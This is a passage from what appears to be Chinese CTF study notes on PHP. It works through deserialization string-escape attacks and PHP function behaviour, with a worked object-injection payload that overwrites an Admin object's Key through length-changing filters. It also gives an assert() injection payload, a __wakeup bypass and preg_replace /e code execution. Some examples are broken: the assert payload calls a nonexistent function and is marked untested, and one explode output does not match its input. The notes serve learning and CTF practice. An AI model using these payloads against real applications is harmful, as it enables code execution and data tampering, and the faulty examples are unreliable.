class="keyword">$this</span>-&gt;Key=<span class="variable">$Key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;passwd = <span class="variable">$passwd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> User(<span class="string">&#x27;guest&#x27;</span>,<span class="keyword">new</span> Admin(<span class="string">&#x27;hack&#x27;</span>)));</span><br></pre></td></tr></table></figure></li></ul><blockquote>#[Out] // 原本无换行符与任何空格，为了可读性而手动添加<br>O:4:"User":2:{<br>&emsp;s:8:"username";s:5:"guest";<br>&emsp;s:6:"passwd";O:5:"Admin":1:{<br>&emsp;&emsp;s:3:"Key";s:4:"hack";<br>&emsp;}<br>}</blockquote>  </li><li><p>确定了需要构造的对象即为上文中的输出</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#此处用户只能控制User类中的$username与$passwd</span></span><br><span class="line"><span class="comment">#却可以通过逃逸修改Admin类中的$Key</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Key</span>=<span class="string">&quot;onlyAdminKnow&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Key=<span class="variable">$Key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;Key,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;passwd = <span class="variable">$passwd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterLess</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s</span>=str_replace(<span class="string">&#x27;FLAG&#x27;</span>,<span class="string">&#x27;NO&#x27;</span>,<span class="variable">$s</span>);<span class="comment">#减少2个字符</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterMore</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s</span>=str_replace(<span class="string">&#x27;FLAG&#x27;</span>,<span class="string">&#x27;_JESUS_&#x27;</span>,<span class="variable">$s</span>);<span class="comment">#增加3个字符</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># BASIC:↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$iusername</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$ipasswd</span>=<span class="string">&#x27;guestpass&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span>=serialize(<span class="keyword">new</span> User(<span class="variable">$iusername</span>,<span class="variable">$ipasswd</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>,<span class="string">&quot;\n&quot;</span>;<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;guest&quot;;s:6:&quot;passwd&quot;;s:9:&quot;guestpass&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">HACK:</span>↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span>=<span class="string">&#x27;&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">#这就是希望注入的内容，修改Admin类中的$Key为hack</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># LESS:↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;======LESS START======&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#思想在于：标记长度不变的情况下数据减少了</span></span><br><span class="line">    <span class="comment">#也就是说会有与减少量相等的字符数量被吞并为变量的value</span></span><br><span class="line">    <span class="variable">$dataEatenByLess</span>=<span class="string">&#x27;&quot;;s:6:&quot;passwd&quot;;s:41:&quot;&#x27;</span>;</span><br><span class="line">    <span class="comment">#希望被filterLess吃掉的字符串如上</span></span><br><span class="line">    <span class="keyword">echo</span> strlen(<span class="variable">$dataEatenByLess</span>),<span class="string">&quot;\n&quot;</span>;<span class="comment">//21</span></span><br><span class="line">    <span class="comment">#每个FLAG吞2字符，在passwd补一位凑3的倍数</span></span><br><span class="line">    <span class="comment">#11个FLAG吞完，吞完后要改什么变量就随心所欲了</span></span><br><span class="line">    <span class="variable">$payloadPasswd</span>=<span class="string">&#x27;0&#x27;</span>.<span class="variable">$target</span>;</span><br><span class="line">    <span class="variable">$payloadLess</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">11</span>;<span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$payloadLess</span>.=<span class="string">&#x27;FLAG&#x27;</span>;</span><br><span class="line">    <span class="variable">$data</span>=serialize(<span class="keyword">new</span> User(<span class="variable">$payloadLess</span>,<span class="variable">$payloadPasswd</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$data</span>,<span class="string">&quot;\n&quot;</span>;<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:44:&quot;FLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAG&quot;;s:6:&quot;passwd&quot;;s:54:&quot;0&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;&quot;;&#125;</span></span><br><span class="line">    unserialize(filterLess(<span class="variable">$data</span>));<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:44:&quot;NONONONONONONONONONONO&quot;;s:6:&quot;passwd&quot;;s:54:&quot;0&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;&quot;;&#125;</span></span><br><span class="line">    <span class="comment">//hack</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MORE:↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;======MORE START======&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#思想在于：标记长度不变的情况下数据增加了</span></span><br><span class="line">    <span class="comment">#计算好需要逃逸的量，使其刚好与增加量相等，这些字符就跑到变量的value之外了</span></span><br><span class="line">    <span class="keyword">echo</span> strlen(<span class="variable">$target</span>),<span class="string">&quot;\n&quot;</span>;<span class="comment">//53</span></span><br><span class="line">    <span class="comment">#每个FLAG溢出3个字符，需要逃逸53个字符</span></span><br><span class="line">    <span class="comment">#在逃逸字符闭合后面加上任意一个字符凑成3的倍数，18个FLAG达到溢出量</span></span><br><span class="line">    <span class="variable">$dataOverflow</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">18</span>;<span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$dataOverflow</span>.=<span class="string">&#x27;FLAG&#x27;</span>;</span><br><span class="line">    <span class="variable">$dataOverflow</span>.=<span class="variable">$target</span>.<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="variable">$data</span>=serialize(<span class="keyword">new</span> User(<span class="variable">$dataOverflow</span>,<span class="string">&#x27;anything&#x27;</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$data</span>,<span class="string">&quot;\n&quot;</span>;<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:126:&quot;FLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAG&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;0&quot;;s:6:&quot;passwd&quot;;s:8:&quot;anything&quot;;&#125;</span></span><br><span class="line">    unserialize(filterMore(<span class="variable">$data</span>));<span class="comment">//&#123;s:8:&quot;username&quot;;s:126:&quot;_JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS_&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;0&quot;;s:6:&quot;passwd&quot;;s:8:&quot;anything&quot;;&#125;</span></span><br><span class="line">    <span class="comment">//hack</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="PHP太怪了"><a href="#PHP太怪了" class="headerlink" title="PHP太怪了"></a>PHP太怪了</h2><h3 id="变量套变量"><a href="#变量套变量" class="headerlink" title="变量套变量"></a>变量套变量</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$hello</span>=<span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$a</span>;<span class="comment">//输出 world</span></span><br></pre></td></tr></table></figure><h3 id="变量套函数"><a href="#变量套函数" class="headerlink" title="变量套函数"></a>变量套函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showstr</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">showstr();</span><br><span class="line"><span class="comment">//正常的调用方法</span></span><br><span class="line"><span class="variable">$action</span> = <span class="string">&quot;showstr&quot;</span>;</span><br><span class="line"><span class="variable">$action</span>();<span class="comment">//实际调用了showstr()函数</span></span><br></pre></td></tr></table></figure><hr><h1 id="PHP-func-DICT"><a href="#PHP-func-DICT" class="headerlink" title="PHP func DICT"></a><big><center>PHP <i>func</i> DICT</center></big></h1><p><code>error_reporting(0)</code>    # 关闭错误报告</p><p><code>print()</code>/<code>print_r()</code>/<code>echo</code>    # echo更像是如 if，while这样的语言结构，没有返回值，且可以直接打印多个变量；print()与 print_r()是函数，存在返回值 true；其中 print_r()相比 print()可以传入的变量范围更大，数组也可以用 print_r()打印出来</p><p><code>var_dump($var)</code>    # 展示$var的value与type</p><p><code>eval($str)</code>    # 执行参数中包含的PHP代码</p><p><code>assert($str)</code>    # 断言，可以看作异常处理的一种高级形式，用于调试代码，重点在于assert函数会将传入的 str类型参数全部当成 PHP代码执行，与 eval类似。但根据测试，assert的代码不能有空格，也不能输入多个语句</p><ul><li><p>assert的闭合 // 理论上如此，待测试</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//POST：myString=&#x27;&#x27;) or print_r(file_get_content(flag.php));#</span></span><br><span class="line">assert(<span class="variable">$_POST</span>[<span class="string">&#x27;myString&#x27;</span>]) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;holyShit&quot;</span>);</span><br><span class="line"><span class="comment">//最终会执行的是：</span></span><br><span class="line">assert(<span class="string">&#x27;&#x27;</span>) <span class="keyword">or</span> print_r(file_get_content(flag.php));<span class="comment">#) or die(&quot;holyShit&quot;);</span></span><br></pre></td></tr></table></figure></li></ul><p><code>scandir($str)</code>    # 扫描指定目录下的文件，返回值为文件名组成的数组</p><p><code>die(str)</code>与<code>exit(str)</code>    # 退出当前脚本并弹出 status状态描述，其中比较有趣的是or die()这种组合。因 PHP并不区分数据类型，所以$file既可以是int也可以bool，所以这样的语句不会报错，在大多数的语言中，bool or bool这样的语句中，若前一个值为真后一个值就不再判断了。例如下列代码，如果 fopen函数执行正确的话，会返回一个大于0的int值（文件指针资源，这其实就是true），后面的语句就不会执行了，而失败时返回false</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;抱歉，无法打开: <span class="subst">$filename</span>&quot;</span>);</span><br><span class="line"><span class="literal">true</span> <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;no1&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;no.1 passed&quot;</span>;</span><br><span class="line"><span class="literal">false</span> <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;no2&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;no.2 passed&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote>[Out]<br>no.1 passed<br>no2</blockquote><p><code>system(shell command)</code>    # 执行shell命令</p><p><code>file_get_contents($stream)</code>    # 将数据流读入字符串，若php://input作为参数，就可以将用户输入读成字符串</p><p><code>file($stream)</code>    # 将数据流读入数组，每行作一个元素</p><p><code>highlight_file($filename,$return)</code>    # 对文件进行语法高亮输出，$return参数可选，默认为false；当为true时返回字符串而不输出</p><p><code>extract($array)</code>    # 输入一个数组，将数组中的元素解析到对应的变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$my_array</span> = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span> =&gt; <span class="string">&quot;Cat&quot;</span>,<span class="string">&quot;b&quot;</span> =&gt; <span class="string">&quot;Dog&quot;</span>, <span class="string">&quot;c&quot;</span> =&gt; <span class="string">&quot;Horse&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=extract(<span class="variable">$my_array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$a = <span class="subst">$a</span>; \$b = <span class="subst">$b</span>; \$c = <span class="subst">$c</span>&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote>$a = 3; $b = Dog; $c = Horse</blockquote><p><code>eregi($str1,$str2)</code>与<code>ereg($str1,$str2)</code>    # 在 str2中搜索 str1中的字符，存在时返回 true，这两个函数完全相同，除了前者忽略大小写，后者不忽略大小写，当第一个字段为空 (NULL)时，就绕过了此函数 // 这两个函数都是 PHP4，PHP5才有，较为远古</p><p><code>trim($str1, $str2)</code>    # 当只填一个参数时，trim函数返回去除字符串两侧的空白字符后的结果；当填了第二个参数后，trim函数返回 $str1两端去除 $str2指定的字符后的结果</p><p><code>strstr($str1,$str2)</code>与<code>stristr(\$str1,\$str2)</code>    # 查找$str2在$str1中第一次出现的地方，并返回剩余部分，如$str1=”abcde”，$str2=”cd”，则返回 “cde”。前者严格比较大小写，可用更改大小写检查网页是否使用strstr()进行过滤；后者对大小写不敏感</p><p><code>substr($str,$int1,$int2)</code>    # 返回$str中第$int1个字符开始，的$int2个字符组成的字符串，当$int2不设置时返回第$int1个字符后的全部字符</p><p><code>strcmp($str1, $str2)</code>    # 比较两个字符串，当两个字符串相等，返回 0，前者大于后者返回 1，后者大于前者返回 -1，字符串的大小根据自然排序比较，大概就跟着感觉走的意思 …</p><p><code>str_replace($str1,$str2,$str3)</code>    # 把$str3中存在的所有$str1替换为$str2</p><p><code>stripos($str1,$str2)</code>    # 查找 str2在 str1中第一次出现的位置，返回 int</p><p><code>parse_str($str)</code>    # 把查询字符串解析到变量中，如parse_str(“name=Bill&amp;age=60”); 则现在有了两个变量$name=Bill 和$age=60</p><p><code>str_split($str,$len)</code>    # 把字符串分割到数组中，按长度分割，$len默认为1，看个例子就明白了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(str_split(<span class="string">&quot;S hangh ai&quot;</span>,<span class="number">3</span>));</span><br></pre></td></tr></table></figure><blockquote>[Out]<br>Array(<br>    &emsp;[0] => S h<br>    &emsp;[1] => ang<br>    &emsp;[2] => h a<br>    &emsp;[3] => i<br>)</blockquote><p><code>explode($str1,$str2)</code>    # $str1作为分隔符，以此将字符串打散为数组，看个例子就明白了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Hello World, I love You&quot;</span>;</span><br><span class="line">print_r (explode(<span class="string">&quot; &quot;</span>,<span class="variable">$str</span>));<span class="comment">//空格作为分隔符</span></span><br></pre></td></tr></table></figure><blockquote>[Out]<br>Array(<br>&emsp;[0] => Hello<br>&emsp;[1] => world.<br>&emsp;[2] => I<br>&emsp;[3] => love<br>&emsp;[4] => Shanghai!<br>)</blockquote><p><code>preg_replace($pattern, $replacement, $subject)</code>    # 其中 {$pattern为正则表达式，$replacement为替换字符串，$subject 为要搜索替换的目标字符串或字符串数组} 。这个函数正则表达式$pattern以“/e”结尾时$replacement的值会被作为PHP函数执行，例如执行preg_replace (‘/test/e’ , “phpinfo();” , “test”)，“test”会被替换为 phpinfo();并执行</p><p><code>preg_match($pattern, $str, $matches)</code>    # 其中 $pattern为正则表达式，$str为被搜索的目标字符串，若提供了参数 $matches，则会在匹配到后被返回，且附加在字符串中的 index，示例如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&#x27;/(foo)(bar)(baz)/&#x27;</span>, <span class="string">&#x27;foobarbaz&#x27;</span>, <span class="variable">$matches</span>, PREG_OFFSET_CAPTURE);</span><br><span class="line">print_r(<span class="variable">$matches</span>);</span><br></pre></td></tr></table></figure><blockquote>[Out]<br>Array(<br>&emsp;[0] => Array(<br>&emsp;&emsp;[0] => foobarbaz<br>&emsp;&emsp;[1] => 0<br>&emsp;)<br>&emsp;[1] => Array(<br>&emsp;&emsp;[0] => foo<br>&emsp;&emsp;[1] => 0<br>&emsp;)<br>&emsp;[2] => Array(<br>&emsp;&emsp;[0] => bar<br>&emsp;&emsp;[1] => 3)<br>&emsp;[3] => Array(<br>&emsp;&emsp;[0] => baz<br>&emsp;&emsp;[1] => 6<br>&emsp;)<br>)</blockquote><p><code>serialize()</code>与<code>unserialize()</code>    # 序列化与反序列化，互为反函数，只需了解序列化即可，简单来说就是把变量转为 string，保留关于原本数据类型的信息，序列化的存在意义在于使一切变量的传输无异于字符串传输；但需要注意的是private变量名前会有%00包裹类名占位</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Kyriota</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>=<span class="string">&quot;male&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="number">25</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weight</span>=<span class="number">60.5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$LoveCTF</span>=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$thingsDoentLike</span>=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$tags</span>=<span class="keyword">array</span>(<span class="string">&quot;Steam&quot;</span>,<span class="number">1990</span>,<span class="string">&quot;Aperture&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> Kyriota()),<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote>[Out]//原本无换行符与任何空格，为了可读性而手动添加<br>O:7:"Kyriota":6:{<br>&emsp;s:3:"sex";s:4:"male";<br>&emsp;s:3:"age";i:25;<br>&emsp;s:6:"weight";d:60.5;<br>&emsp;s:7:"LoveCTF";b:1;<br>&emsp;s:15:"thingsDoentLike";N;<br>&emsp;s:13:"%00Kyriota%00tags";a:3:{<br>&emsp;&emsp;i:0;s:5:"Steam";<br>&emsp;&emsp;i:1;i:1990;<br>&emsp;&emsp;i:2;s:8:"Aperture";<br>&emsp;}<br>}</blockquote><ul><li><p><code>__wakeup()</code>与<code>__sleep()</code>    # 在 serialize()的时候先执行__sleep()，对数据预处理；在 unserialize()执行的时候先执行__wakeup()，对数据再处理。函数命名非常形象，序列化后变量与对象不再被解析，称其为sleep与wakeup非常合适</p></li><li><p>__wakeup()绕过：当序列化字符串表示的对象属性个数大于真是个数时就会跳过 __wakeup()执行，例如下面是一正常序列化后的文本，而当3被篡改为任何大于3的数后，反序列化时将不执行__wakeup()：</p><center><code>O:7:”Student”:3:&#123;s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:&#123;&#125;&#125;</code></center></li><li><p><code>__construct()</code>与<code>__destruct()</code>    # 在创建对象时construct，在对象销毁时destruct</p></li></ul><p>一个程序即可解释序列化以及上述相关函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__construct~&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__destrcut~&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__wakeup~&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__sleep~&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span>=serialize(<span class="keyword">new</span> User(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;psswd&#x27;</span>));</span><br><span class="line"><span class="variable">$s_edited</span>=<span class="string">&#x27;O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;psswd&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">unserialize(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;↑↑↑unserialized with wakeup and destruct&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$s_edited</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;↑↑↑unserialized, only destruct whithout wakeup above this 